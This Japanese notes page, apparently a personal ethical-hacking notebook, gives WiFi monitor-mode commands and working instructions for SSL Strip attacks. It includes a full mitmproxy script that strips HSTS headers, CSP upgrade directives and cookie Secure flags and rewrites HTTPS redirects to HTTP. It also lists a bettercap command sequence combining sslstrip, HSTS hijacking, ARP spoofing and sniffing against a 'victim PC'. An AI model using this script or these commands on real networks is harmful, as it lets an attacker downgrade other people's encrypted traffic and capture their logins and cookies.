# モニターモード

## コマンド

```
# アダプターをモニターモードにする
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# 周囲のWiFiをモニターする
sudo airmon-ng wlan0mon

# 特定のSSID/APに絞ってモニターする
sudo airodump-ng <AP MAC address> --channel <channel No> wlan0
```

## 参考文献・サイト

- [WIFI アダプターをモニターモードにする(WIFI クラッキングに必須)](https://medium.com/ethical-hacking-%E3%83%9B%E3%83%AF%E3%82%A4%E3%83%88%E3%83%8F%E3%83%83%E3%82%AB%E3%83%BC/wifi%E3%82%A2%E3%83%80%E3%83%97%E3%82%BF%E3%83%BC%E3%82%92%E3%83%A2%E3%83%8B%E3%82%BF%E3%83%BC%E3%83%A2%E3%83%BC%E3%83%89%E3%81%AB%E3%81%99%E3%82%8B-%E6%9C%80%E9%87%8D%E8%A6%81%E3%82%B9%E3%82%AD%E3%83%AB-5ee7a57e5165)

# SSL Strip 攻撃

## SSL Strip 攻撃について

SSL Strip 攻撃の概要ついては[この論文](https://www.sci.kanagawa-u.ac.jp/info/matsuo/pub/pdf/IPSJCSS2016107.pdf)が説明してくれている。

## mitmproxy を用いた実装

### Python コード

1. mitmproxy の任意のディレクトリにファイルを作成し、以下のコードを実装する。

```
"""
参考コード
https://github.com/mitmproxy/mitmproxy/blob/main/examples/contrib/sslstrip.py

正規表現操作についての参考文献
https://qiita.com/FukuharaYohei/items/459f27f0d7bbba551af7

assertについて
https://qiita.com/nannoki/items/15004992b6bb5637a9cd

Set-Cookieについての説明
https://developer.mozilla.org/ja/docs/Web/HTTP/Headers/Set-Cookie
"""

import re
import urllib.parse
import typing
from mitmproxy import http

secure_hosts: typing.Set[str] = set()

def request(flow: http.HTTPFlow) -> None:
    # If-Modified-Since:
    # リクエストの条件を無くす
    flow.request.headers.pop('If-Modified-Since', None)

    # Cache-Control:
    # リクエストとレスポンスの両方でキャッシュのためのディレクティブ (指示) が格納されている
    flow.request.headers.pop('Cache-Control', None)

    # Upgrade-Insecure-Requests:
    # ユーザーエージェントに、すべてのサイトの安全でないURL (HTTP経由で提供されるURL) を
    # セキュリティで保護された URL (HTTPSを介して提供されるもの) で置き換えられたかのように処理するよう指示
    flow.request.headers.pop('Upgrade-Insecure-Requests', None)

    # リクエストで受けとったホスト名が、配列として保持しているホスト名の中に存在するならば、そのスキーム及びポート番号を変更
    if flow.request.pretty_host in secure_hosts:
        flow.request.scheme = 'https'
        flow.request.port = 443
        flow.request.host = flow.request.pretty_host

def response(flow: http.HTTPFlow) -> None:
    assert flow.response

    # Strict-Transport-Security:
    # ウェブサイトがブラウザに HTTP の代わりに HTTPS を用いて通信を行うよう指示するためのもの
    # これは必須（っぽい）
    flow.response.headers.pop('Strict-Transport-Security', None)

    # これは、HTMLファイル内に埋め込まれているハイパーリンクのスキームも書き換えてしまう。
    # ブラウザ側でバレバレだったのでいらないかも、一旦コメントアウト
    # flow.response.content = flow.response.content.replace(b'https://', b'http://')

    # <meta>要素を用いてCSPを指定している場合、この該当部分をコンテンツから消す
    csp_meta_tag_pattern = br'<meta.*http-equiv=["\']Content-Security-Policy[\'"].*upgrade-insecure-requests.*?>'
    flow.response.content = re.sub(csp_meta_tag_pattern, b'', flow.response.content, flags=re.IGNORECASE)

    # ヘッダのスキームの書き換え
    if flow.response.headers.get('Location', '').startswith('https://'):
        location = flow.response.headers['Location']
        hostname = urllib.parse.urlparse(location).hostname
        if hostname:
            secure_hosts.add(hostname)
        flow.response.headers['Location'] = location.replace('https://', 'http://', 1)

    csp_header = flow.response.headers.get('Content-Security-Policy', '')
    if re.search('upgrade-insecure-requests', csp_header, flags=re.IGNORECASE):
        csp = flow.response.headers['Content-Security-Policy']
        new_header = re.sub(r'upgrade-insecure-requests[;\s]*', '', csp, flags=re.IGNORECASE)
        flow.response.headers['Content-Security-Policy'] = new_header

    cookies = flow.response.headers.get_all('Set-Cookie')
    cookies = [re.sub(r';\s*secure\s*', '', s) for s in cookies]
    flow.response.headers.set_all('Set-Cookie', cookies)
```

2. 以下のコマンドを実行

```
$ mitmproxy -s <ファイル名>.py
```

## bettercap を用いた実装

### 準備物

- ALFA Network long range usb adapter
- GL-AR300M(Shadow)
- 被害者 PC
- 攻撃者 PC(ツール：kali linux)

### 手順

1. 攻撃者 PC と被害者 PC を同じ LAN に入れる。
1. [kali linux](https://www.kali.org/get-kali/#kali-platforms)に[bettercap](https://github.com/bettercap/bettercap)を`clone`。
1. root 権限で以下のコマンドを順に実行していく。

```
  $ bettercap -iface wlan0
  $ caplets.update
  $ set http.proxy.sslstrip true
  $ hstshijack/hstshijack
  $ net.probe on
  $ net.sniff on
  $ arp.spoof on
```

これで対称のクライアントに SSL Strip を実装できる。ただしバレバレではある。
